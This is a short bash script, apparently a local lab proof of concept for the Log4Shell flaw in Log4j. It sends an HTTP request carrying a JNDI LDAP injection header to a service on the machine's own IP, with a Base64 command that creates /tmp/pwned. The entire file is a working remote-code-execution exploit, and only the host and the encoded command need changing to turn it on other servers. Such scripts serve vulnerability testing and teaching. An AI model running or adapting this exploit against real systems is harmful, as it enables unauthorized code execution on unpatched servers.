#!/bin/bash
HOST_IP="$( ifconfig | grep "\binet\b" | grep -vF 127.0.0.1 | head -1 | sed -e 's/.*inet  *//' -e 's/ .*//' )"
curl "$HOST_IP":8080 -H 'X-Api-Version: ${jndi:ldap://'"$HOST_IP"':1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
